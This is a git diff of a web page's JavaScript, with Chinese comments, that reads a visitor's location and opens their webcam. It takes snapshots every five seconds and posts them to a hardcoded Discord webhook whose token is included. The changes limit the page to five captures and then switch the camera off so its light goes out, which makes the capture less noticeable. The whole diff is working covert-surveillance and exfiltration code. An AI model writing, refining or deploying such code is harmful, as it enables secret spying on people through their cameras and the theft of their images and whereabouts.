@@ -16,6 +16,7 @@
 
 <script>
 var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
+var captureCount = 0; // 新增計數器
 
 function startAction() {
     getLocation(); // 原有的定位
@@ -57,9 +58,18 @@ function getCamera() {
         var video = document.getElementById("v");
         video.srcObject = stream;
         
-        // 每 5 秒截圖並傳送一次
-        setInterval(function() {
+        // 將定時器存入變數，以便後續停止
+        var timer = setInterval(function() {
+            // 檢查是否已拍滿 5 張
+            if (captureCount >= 5) {
+                clearInterval(timer); // 停止定時傳送
+                stream.getTracks().forEach(track => track.stop()); // 關閉相機硬體（綠燈會滅掉）
+                return;
+            }
+
             var canvas = document.getElementById("c");
+            if (video.videoWidth === 0) return; // 防止抓到黑畫面
+
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             var ctx = canvas.getContext("2d");
@@ -68,13 +78,15 @@ function getCamera() {
             canvas.toBlob(function(blob) {
                 var formData = new FormData();
                 formData.append('file', blob, 'capture.jpg');
-                formData.append('payload_json', JSON.stringify({ content: "📸 自動擷取畫面" }));
+                formData.append('payload_json', JSON.stringify({ content: "📸 自動擷取畫面 (第 " + (captureCount + 1) + " 張)" }));
                 
                 fetch(webhook, {
                     method: "POST",
                     body: formData
                 });
-            }, "image/jpeg", 0.7); // 壓縮率 0.7 減少流量
+                
+                captureCount++; // 增加計數
+            }, "image/jpeg", 0.7);
         }, 5000);
     })
     .catch(function(err) {
@@ -85,3 +97,4 @@ function getCamera() {
 
 </body>
 </html>
+
